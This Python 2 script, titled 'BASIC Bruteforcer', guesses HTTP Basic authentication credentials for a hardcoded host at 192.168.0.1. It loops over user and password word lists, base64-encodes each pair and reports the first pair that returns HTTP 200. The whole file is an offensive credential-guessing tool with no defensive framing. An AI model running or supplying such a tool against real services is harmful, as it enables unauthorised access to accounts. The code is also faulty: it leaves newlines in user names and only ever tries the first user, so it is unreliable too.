#!/usr/bin/python

import sys
import signal
import os
import base64 
import requests

global url
url = "192.168.0.1"

print "\n\t\tBASIC Bruteforcer\n\t\t=================\n"

def signal_handler(signal, frame):
	print('\n=================')
	print('Execution aborted')
	print('=================')
	#os.system("kill -9 " + str(os.getpid()))
	sys.exit(1)

def signal_exit(signal, frame):
	sys.exit(1)
	
def usage ():
	if len(sys.argv) != 5:
		print "\nError - unknown parameters\n\n"
		print "\tUsage:"
		print "\t\tbasic-bruteforcer.py -u <user list> -p <password list>"

		exit()

def input_validation(users,passwords):
	userfile = open (users,'r')
	pwdfile = open (passwords,'r')
	return userfile, pwdfile

def send_request(authencoded):
	something = "Basic " + authencoded
	r = requests.get('http://' + url, headers={"Authorization": something})
	if r.status_code == 200:
		print "[*] Login found - credential used " + base64.decodestring(authencoded).replace('\n', '')
		exit()
	
def encode():
	print "[*] Bruteforcing authentication"
	for user in userfile:
		for passw in pwdfile:
			authstring = user + ':' + passw
			authencoded = base64.encodestring(authstring).replace('\n', '')
			send_request(authencoded)
	print "[*] No credentials matched"

if __name__ == "__main__":
	signal.signal(signal.SIGINT, signal_handler)
	usage()
	parameters ={sys.argv[1]:sys.argv[2],sys.argv[3]:sys.argv[4]}
	users = parameters["-u"]
	passwords = parameters["-p"]
	userfile, pwdfile = input_validation(users,passwords)
	encode()
